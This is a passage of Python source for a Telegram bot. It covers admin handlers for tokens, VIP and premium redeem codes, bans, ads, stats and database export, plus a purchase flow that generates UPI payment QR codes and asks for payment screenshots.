@bot.message_handler(func=lambda m: m.text == "🗑 Remove Custom Button")
def admin_remove_custom_btn(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    c = db["settings"].get("custom_buttons", [])
    if not c:
        bot.send_message(message.chat.id, "<blockquote>No buttons.</blockquote>", reply_markup=get_admin_menu()); return
    mk = types.InlineKeyboardMarkup(row_width=1)
    for b in c: mk.add(types.InlineKeyboardButton(b, callback_data=f"del_cbtn:{b}"))
    bot.send_message(message.chat.id, "<blockquote>Delete:</blockquote>", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("del_cbtn:"))
def del_cbtn_callback(call):
    if not _is_admin(call.from_user.id): return
    b = call.data.split(":", 1)[1]
    db = load_db()
    c = db["settings"].get("custom_buttons", [])
    if b in c: c.remove(b); save_db(db)
    bot.answer_callback_query(call.id, "Removed")
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception: pass
    bot.send_message(call.message.chat.id, f"✅ Removed: {b}", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_SET_DISCOUNT)
def admin_set_discount(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    cur = db["settings"].get("discount_rate", 0)
    msg = bot.send_message(message.chat.id, f"<blockquote>Discount % (current: {cur}):\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_set_discount_apply)

def admin_set_discount_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        v = int(message.text.strip())
        if v < 0 or v > 100: raise ValueError
        db = load_db(); db["settings"]["discount_rate"] = v; save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {v}%</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ 0-100!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_SET_TOKENS_CMD)
def admin_set_tokens_cmd(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    costs = db["settings"].get("command_tokens", {})
    text = "🪙 <b>Costs</b>\n"
    for k, v in costs.items(): text += f"• {k}: <b>{v}</b>\n"
    text += "\nFormat: <code>cmd_key new_cost</code>"
    msg = bot.send_message(message.chat.id, f"<blockquote>{text}\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_set_tokens_cmd_apply)

def admin_set_tokens_cmd_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        parts = message.text.strip().split()
        k, c = parts[0], int(parts[1])
        if c < 0: raise ValueError
        db = load_db(); db["settings"]["command_tokens"][k] = c; save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {k}={c}</blockquote>", reply_markup=get_admin_menu())
    except Exception:
        bot.send_message(message.chat.id, f"<blockquote>❌ Format: <code>camera 3</code></blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_BOT_AD)
def admin_bot_ad_menu(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    ad = db["settings"].get("ad_bot")
    status = "Active ✅" if (ad and ad.get("active")) else "Inactive ❌"
    bot.send_message(message.chat.id,
        f"<blockquote>📢 <b>Bot Ad</b>\nStatus: <b>{status}</b>\n"
        f"Current: {ad.get('name') if ad else 'None'}\n\n"
        f"• <code>/setad Name | url</code>\n• <code>/removead</code></blockquote>")

@bot.message_handler(commands=['setad'])
def cmd_setad(message):
    if not _is_admin(message.from_user.id): return
    try:
        raw = message.text.split(None, 1)[1]
        n, l = [x.strip() for x in raw.split("|")]
        db = load_db(); db["settings"]["ad_bot"] = {"name": n, "link": l, "active": True}; save_db(db)
        bot.reply_to(message, f"<blockquote>✅ {n} → {l}</blockquote>")
    except Exception:
        bot.reply_to(message, "<blockquote>❌ <code>/setad Name | url</code></blockquote>")

@bot.message_handler(commands=['removead'])
def cmd_removead(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    if "ad_bot" in db["settings"]:
        db["settings"]["ad_bot"]["active"] = False; save_db(db)
    bot.reply_to(message, "<blockquote>✅ Ad disabled</blockquote>")

@bot.message_handler(func=lambda m: m.text == BTN_USER_ACTIVITY)
def admin_user_activity(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    users = db.get("users", {})
    text = f"<blockquote>👥 <b>Total Users: {len(users)}</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in list(users.items())[-15:]:
        text += f"• <b>{data.get('name','N/A')}</b> | <code>{uid}</code> | {data.get('username','N/A')}\n"
    text += f"\n{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text)

@bot.message_handler(func=lambda m: m.text == BTN_USER_PLAN)
def admin_user_plan(message):
    if not _is_admin(message.from_user.id): return
    db = load_db(); users = db.get("users", {})
    text = "<blockquote>📋 <b>Plans</b>\n"
    now = datetime.now()
    for uid, d in list(users.items())[-20:]:
        plan = d.get("plan", "free"); exp = d.get("expiry"); tk = d.get("tokens", 0)
        prem = "🔥P" if d.get("premium_expiry") and datetime.strptime(d["premium_expiry"], "%Y-%m-%d %H:%M:%S") > now else ""
        if int(uid) == ADMIN_ID: s = "👑 Admin"
        elif plan == "unlimited" and exp:
            try:
                e = datetime.strptime(exp, "%Y-%m-%d %H:%M:%S")
                s = f"👑 VIP ({max(1,(e-now).days+1)}d) {prem}" if now < e else f"⚠️ | {tk} {prem}"
            except: s = f"⚠️ | {tk} {prem}"
        elif tk > 0: s = f"🪙 {tk} {prem}"
        else: s = f"❌ {prem}"
        text += f"• {d.get('name','N/A')} | <code>{uid}</code> | {s}\n"
    text += f"{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text)

@bot.message_handler(func=lambda m: m.text == BTN_ACTIVATE_PLAN)
def admin_activate_info(message):
    if not _is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, f"<blockquote>⚡ <b>Commands</b>\n<code>/setvip UID DAYS</code>\n<code>/addtokens UID TOKENS</code>\n<code>/broadcast_vip DAYS</code>\n{DEV_TAG}</blockquote>")

@bot.message_handler(func=lambda m: m.text == BTN_GEN_REDEEM)
def admin_gen_redeem(message):
    if not _is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, f"<blockquote>Type:\n1. Normal (Tokens)\n2. VIP\n3. Premium</blockquote>", reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True).add(kbtn("Normal","primary"), kbtn("VIP","success"), kbtn("Premium","danger")))

@bot.message_handler(func=lambda m: m.text == "Premium" and int(m.from_user.id) == ADMIN_ID)
def admin_prem_users(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>Users?</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_prem_days)

def admin_prem_days(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        uc = int(message.text.strip())
        msg = bot.send_message(message.chat.id, f"<blockquote>Days?</blockquote>")
        bot.register_next_step_handler(msg, admin_prem_create, uc)
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Number!</blockquote>", reply_markup=get_admin_menu())

def admin_prem_create(message, uc):
    try:
        dc = int(message.text.strip())
        code = "PREM-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        db = load_db()
        db["redeem_codes"][code] = {"type": "premium", "days": dc, "uses_left": uc, "used_by": [], "note": "Premium"}
        save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>🔥 <code>{code}</code>\n{uc} users | {dc} days Premium</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Invalid!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == "Normal" and int(m.from_user.id) == ADMIN_ID)
def admin_normal_users(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>Users?\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_normal_tokens)

def admin_normal_tokens(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        uc = int(message.text.strip())
        msg = bot.send_message(message.chat.id, f"<blockquote>Tokens per user?</blockquote>")
        bot.register_next_step_handler(msg, admin_normal_create, uc)
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Number!</blockquote>", reply_markup=get_admin_menu())

def admin_normal_create(message, uc):
    try:
        tc = int(message.text.strip())
        code = "AYUSH-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        db = load_db()
        db["redeem_codes"][code] = {"type": "token", "value": tc, "uses_left": uc, "used_by": [], "note": "Normal"}
        save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>🎟 <code>{code}</code>\n{uc} users | {tc} tokens</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Invalid!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == "VIP" and int(m.from_user.id) == ADMIN_ID)
def admin_vip_users(message):
    msg = bot.send_message(message.chat.id, f"<blockquote>Users?</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_vip_days)

def admin_vip_days(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        uc = int(message.text.strip())
        msg = bot.send_message(message.chat.id, f"<blockquote>Days?</blockquote>")
        bot.register_next_step_handler(msg, admin_vip_create, uc)
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Number!</blockquote>", reply_markup=get_admin_menu())

def admin_vip_create(message, uc):
    try:
        dc = int(message.text.strip())
        code = "AYUSH-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        db = load_db()
        db["redeem_codes"][code] = {"type": "unlimited", "days": dc, "uses_left": uc, "used_by": [], "note": "VIP"}
        save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>👑 <code>{code}</code>\n{uc} users | {dc} days</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Invalid!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_ADD_ALL)
def admin_add_all(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Tokens to add:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_add_all_apply)

def admin_add_all_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        t = int(message.text.strip())
        if t <= 0: raise ValueError
        db = load_db(); c = 0
        for uid in db["users"]:
            db["users"][uid]["tokens"] = db["users"][uid].get("tokens", 0) + t
            _add_history(db["users"][uid], "admin_add_all", t); c += 1
        save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ +{t} to {c} users!</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Invalid!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_DEDUCT_ALL)
def admin_deduct_all(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Tokens to deduct:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_deduct_all_apply)

def admin_deduct_all_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        t = int(message.text.strip())
        if t <= 0: raise ValueError
        db = load_db(); c = 0
        for uid in db["users"]:
            cur = db["users"][uid].get("tokens", 0)
            db["users"][uid]["tokens"] = max(0, cur - t)
            _add_history(db["users"][uid], "admin_deduct_all", -t); c += 1
        save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ -{t} from {c} users!</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Invalid!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_ADD_ONE)
def admin_add_one(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Format: <code>UID TOKENS</code>\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_add_one_apply)

def admin_add_one_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        parts = message.text.split(); uid, t = parts[0], int(parts[1])
        if t <= 0: raise ValueError
        db = load_db()
        if uid not in db["users"]: raise KeyError
        db["users"][uid]["tokens"] = db["users"][uid].get("tokens", 0) + t
        _add_history(db["users"][uid], "admin_add", t); save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {uid} +{t}\n💰 {db['users'][uid]['tokens']}</blockquote>", reply_markup=get_admin_menu())
    except KeyError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu())
    except Exception:
        bot.send_message(message.chat.id, f"<blockquote>❌ Format: <code>UID TOKENS</code></blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_DEDUCT_ONE)
def admin_deduct_one(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Format: <code>UID TOKENS</code>\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_deduct_one_apply)

def admin_deduct_one_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        parts = message.text.split(); uid, t = parts[0], int(parts[1])
        if t <= 0: raise ValueError
        db = load_db()
        if uid not in db["users"]: raise KeyError
        cur = db["users"][uid].get("tokens", 0)
        db["users"][uid]["tokens"] = max(0, cur - t)
        _add_history(db["users"][uid], "admin_deduct", -t); save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {uid} -{t}\n💰 {db['users'][uid]['tokens']}</blockquote>", reply_markup=get_admin_menu())
    except KeyError:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu())
    except Exception:
        bot.send_message(message.chat.id, f"<blockquote>❌ Format: <code>UID TOKENS</code></blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_CHECK_USER)
def admin_check_user(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_check_apply)

def admin_check_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db(); u = db["users"].get(uid)
    if not u:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu()); return
    prem = u.get("premium_expiry") or "N/A"
    text = (f"<blockquote>👤 <b>User</b>\n{u.get('name','N/A')}\n{u.get('username','N/A')}\n"
            f"<code>{uid}</code>\n🪙 {u.get('tokens',0)}\n📦 {u.get('plan','free')}\n"
            f"🔥 Premium Expiry: {prem}\n🚫 {u.get('banned')}\n"
            f"👥 Refs: {len(u.get('referrals',[]))}\n{DEV_TAG}</blockquote>")
    bot.send_message(message.chat.id, text, reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_RESET_USER)
def admin_reset_user(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_reset_apply)

def admin_reset_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db()
    if uid not in db["users"]:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu()); return
    db["users"][uid].update({"tokens": 0, "plan": "free", "expiry": None, "premium_expiry": None, "banned": False})
    save_db(db)
    bot.send_message(message.chat.id, f"<blockquote>♻️ Reset: {uid}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_CODES_LIST)
def admin_codes_list(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    codes = db.get("redeem_codes", {})
    if not codes:
        bot.send_message(message.chat.id, f"<blockquote>No codes.</blockquote>", reply_markup=get_admin_menu()); return
    text = f"<blockquote>🎟 <b>Codes ({len(codes)})</b>\n"
    for code, d in list(codes.items())[:30]:
        if d.get("type") == "token": v = f"{d.get('value')} tokens"
        elif d.get("type") == "premium": v = f"Premium {d.get('days')}d"
        else: v = f"VIP {d.get('days')}d"
        text += f"<code>{code}</code> | {v} | {d.get('uses_left')}\n"
    text += f"{DEV_TAG}</blockquote>"
    bot.send_message(message.chat.id, text, reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_REVOKE_CODE)
def admin_revoke_code(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>Code:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_revoke_apply)

def admin_revoke_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    code = message.text.strip().upper()
    db = load_db()
    if code in db.get("redeem_codes", {}):
        del db["redeem_codes"][code]; save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>🗑 Revoked: {code}</blockquote>", reply_markup=get_admin_menu())
    else:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_STATS)
def admin_stats(message):
    if not _is_admin(message.from_user.id): return
    db = load_db(); users = db.get("users", {})
    total = len(users)
    vip = sum(1 for u in users.values() if u.get("plan") == "unlimited")
    tok = sum(1 for u in users.values() if u.get("tokens", 0) > 0)
    banned = sum(1 for u in users.values() if u.get("banned"))
    codes = len(db.get("redeem_codes", {}))
    tt = sum(u.get("tokens", 0) for u in users.values())
    now = datetime.now()
    prem = sum(1 for u in users.values() if u.get("premium_expiry") and datetime.strptime(u["premium_expiry"], "%Y-%m-%d %H:%M:%S") > now)
    text = (f"<blockquote>📊 <b>Stats</b>\n👥 Users: {total}\n👑 VIP: {vip}\n"
            f"🔥 Premium: {prem}\n"
            f"🪙 Token Holders: {tok}\n💎 Tokens: {tt}\n🚫 Banned: {banned}\n"
            f"🎟 Codes: {codes}\n{DEV_TAG}</blockquote>")
    bot.send_message(message.chat.id, text, reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_BAN)
def admin_ban(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_ban_apply)

def admin_ban_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db()
    if uid not in db["users"]:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu()); return
    db["users"][uid]["banned"] = True; save_db(db)
    bot.send_message(message.chat.id, f"<blockquote>🚫 {uid} banned!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_UNBAN)
def admin_unban(message):
    if not _is_admin(message.from_user.id): return
    msg = bot.send_message(message.chat.id, f"<blockquote>UID:\n{DEV_TAG}</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_unban_apply)

def admin_unban_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    uid = message.text.strip()
    db = load_db()
    if uid not in db["users"]:
        bot.send_message(message.chat.id, f"<blockquote>❌ Not found!</blockquote>", reply_markup=get_admin_menu()); return
    db["users"][uid]["banned"] = False; save_db(db)
    bot.send_message(message.chat.id, f"<blockquote>✅ {uid} unbanned!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_SET_REF)
def admin_set_ref(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    cur = db["settings"].get("referral_credits", 2)
    msg = bot.send_message(message.chat.id, f"<blockquote>Ref credits (current: {cur}):</blockquote>", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, admin_set_ref_apply)

def admin_set_ref_apply(message):
    if message.text in [BTN_BACK_HOME, BTN_BACK_ADMIN, "Back to home"]:
        bot.send_message(message.chat.id, "Cancelled.", reply_markup=get_admin_menu()); return
    try:
        v = int(message.text.strip())
        if v < 0 or v > 100: raise ValueError
        db = load_db(); db["settings"]["referral_credits"] = v; save_db(db)
        bot.send_message(message.chat.id, f"<blockquote>✅ {v} per invite</blockquote>", reply_markup=get_admin_menu())
    except ValueError:
        bot.send_message(message.chat.id, f"<blockquote>❌ 0-100!</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_MAINTENANCE)
def admin_maintenance(message):
    if not _is_admin(message.from_user.id): return
    db = load_db()
    cur = db["settings"].get("maintenance", False)
    db["settings"]["maintenance"] = not cur; save_db(db)
    status = "🔴 ON" if not cur else "🟢 OFF"
    bot.send_message(message.chat.id, f"<blockquote>🔧 Maintenance: {status}</blockquote>", reply_markup=get_admin_menu())

@bot.message_handler(func=lambda m: m.text == BTN_EXPORT_DB)
def admin_export_db(message):
    if not _is_admin(message.from_user.id): return
    try:
        with open("database.json", "rb") as f:
            bot.send_document(message.chat.id, f, caption=f"📤 DB Export")
    except Exception as e:
        bot.send_message(message.chat.id, f"<blockquote>❌ {e}</blockquote>", reply_markup=get_admin_menu())

# ----------------- DIRECT COMMANDS -----------------
@bot.message_handler(commands=['setvip'])
def cmd_setvip(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, u, d = message.text.split(); d = int(d)
        db = load_db()
        if u not in db["users"]: bot.reply_to(message, "❌ Not found"); return
        db["users"][u]["plan"] = "unlimited"
        db["users"][u]["expiry"] = (datetime.now() + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
        _add_history(db["users"][u], f"setvip_{d}d", 0); save_db(db)
        bot.reply_to(message, f"✅ {u} → {d}d VIP")
    except Exception:
        bot.reply_to(message, "❌ <code>/setvip UID DAYS</code>")

@bot.message_handler(commands=['addtokens'])
def cmd_addtokens(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, u, t = message.text.split(); t = int(t)
        db = load_db()
        if u not in db["users"]: bot.reply_to(message, "❌ Not found"); return
        db["users"][u]["tokens"] = db["users"][u].get("tokens", 0) + t
        _add_history(db["users"][u], "addtokens", t); save_db(db)
        bot.reply_to(message, f"✅ {u} +{t}")
    except Exception:
        bot.reply_to(message, "❌ <code>/addtokens UID TOKENS</code>")

@bot.message_handler(commands=['broadcast_vip'])
def cmd_broadcast_vip(message):
    if not _is_admin(message.from_user.id): return
    try:
        _, d = message.text.split(); d = int(d)
        db = load_db()
        exp = (datetime.now() + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
        c = 0
        for uid in db["users"]:
            db["users"][uid]["plan"] = "unlimited"
            db["users"][uid]["expiry"] = exp
            _add_history(db["users"][uid], f"broadcast_vip_{d}d", 0); c += 1
        save_db(db)
        bot.reply_to(message, f"🎉 {d}d VIP → {c} users")
    except Exception:
        bot.reply_to(message, "❌ <code>/broadcast_vip DAYS</code>")

def money(value):
    return Decimal(str(value)).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)

def buy_keyboard():
    db = load_db()
    disc = db["settings"].get("discount_rate", 0)
    mk = types.InlineKeyboardMarkup(row_width=1)
    for pid, plan in db.get("plans", {}).items():
        if plan.get("active", True):
            orig = money(plan.get("price", 0))
            if disc > 0:
                final = money(orig * (Decimal("1") - Decimal(str(disc)) / Decimal("100")))
                label = f"🛍 {plan.get('name', pid)} | ₹{final} ({disc}% OFF)"
            else:
                label = f"🛍 {plan.get('name', pid)} | ₹{orig}"
            mk.add(types.InlineKeyboardButton(label, callback_data=f"buy_plan:{pid}"))
    return mk

@bot.message_handler(func=lambda m: m.text == BTN_BUY)
def direct_buy_menu(message):
    bot.send_message(message.chat.id, f"<blockquote>💳 <b>DIRECT BUY</b></blockquote>", reply_markup=buy_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "buy_open")
def buy_open_callback(call):
    if call.message.chat.type != "private": return
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, f"<blockquote>💳 Plans:</blockquote>", reply_markup=buy_keyboard())

@bot.callback_query_handler(func=lambda c: c.data == "buy_premium")
def buy_premium_callback(call):
    if call.message.chat.type != "private": return
    pid = "prem"
    get_user_data(call.from_user)
    db = load_db(); plan = db.get("plans", {}).get(pid)
    if not plan or not plan.get("active", True):
        bot.answer_callback_query(call.id, "Not available", show_alert=True); return
    orig = money(plan["price"]); disc = db["settings"].get("discount_rate", 0)
    if disc > 0:
        dn = money(orig * Decimal(str(disc)) / Decimal("100"))
        amt = money(orig - dn)
    else:
        dn = money(0); amt = orig
    oid = uuid.uuid4().hex[:10].upper()
    uri = "upi://pay?" + urlencode({"pa": UPI_ID, "pn": "AYUSH", "am": f"{amt:.2f}", "cu": "INR", "tn": f"Order {oid}"})
    qr = qrcode.QRCode(box_size=8, border=3); qr.add_data(uri); qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    bio = io.BytesIO(); bio.name = "upi_qr.png"; img.save(bio, format="PNG"); bio.seek(0)
    db["pending_orders"][oid] = {
        "uid": str(call.from_user.id), "plan_id": pid, "plan": plan.copy(),
        "original": str(orig), "discount": str(dn), "amount": str(amt),
        "status": "awaiting_payment", "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_db(db)
    cap = (f"<b>🧾 Order: <code>{oid}</code></b>\nPlan: {plan.get('name', pid)}\n"
           f"Original: ₹{orig}\n" + (f"Discount: -₹{dn}\n" if disc > 0 else "") +
           f"<b>Payable: ₹{amt}</b>\nUPI: <code>{UPI_ID}</code>\n\n"
           f"QR scan karke pay karein, phir screenshot bhejein.")
    bot.answer_callback_query(call.id, "Order created")
    bot.send_photo(call.message.chat.id, bio, caption=cap, parse_mode="HTML")
    bot.send_message(call.message.chat.id, f"Order: <code>{oid}</code>\nAb payment screenshot bhejein.", parse_mode="HTML")
    bot.register_next_step_handler_by_chat_id(call.message.chat.id, receive_payment_screenshot, oid)

@bot.callback_query_handler(func=lambda c: c.data.startswith("buy_plan:"))
def buy_plan_callback(call):
    if call.message.chat.type != "private": return
    get_user_data(call.from_user)
    pid = call.data.split(":", 1)[1]
    db = load_db(); plan = db.get("plans", {}).get(pid)
    if not plan or not plan.get("active", True):
        bot.answer_callback_query(call.id, "Not available", show_alert=True); return
    orig = money(plan["price"]); disc = db["settings"].get("discount_rate", 0)
    if disc > 0:
        dn = money(orig * Decimal(str(disc)) / Decimal("100"))
        amt = money(orig - dn)
    else:
        dn = money(0); amt = orig
    oid = uuid.uuid4().hex[:10].upper()
    uri = "upi://pay?" + urlencode({"pa": UPI_ID, "pn": "AYUSH", "am": f"{amt:.2f}", "cu": "INR", "tn": f"Order {oid}"})
    qr = qrcode.QRCode(box_size=8, border=3); qr.add_data(uri); qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    bio = io.BytesIO(); bio.name = "upi_qr.png"; img.save(bio, format="PNG"); bio.seek(0)
    db["pending_orders"][oid] = {
        "uid": str(call.from_user.id), "plan_id": pid, "plan": plan.copy(),
        "original": str(orig), "discount": str(dn), "amount": str(amt),
        "status": "awaiting_payment", "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_db(db)
    cap = (f"<b>🧾 Order: <code>{oid}</code></b>\nPlan: {plan.get('name', pid)}\n"
           f"Original: ₹{orig}\n" + (f"Discount: -₹{dn}\n" if disc > 0 else "") +
           f"<b>Payable: ₹{amt}</b>\nUPI: <code>{UPI_ID}</code>\n\n"
           f"QR scan karke pay karein, phir screenshot bhejein.")
    bot.answer_callback_query(call.id, "Order created")
    bot.send_photo(call.message.chat.id, bio, caption=cap, parse_mode="HTML")
    bot.send_message(call.message.chat.id, f"Order: <code>{oid}</code>\nAb payment screenshot bhejein.", parse_mode="HTML")
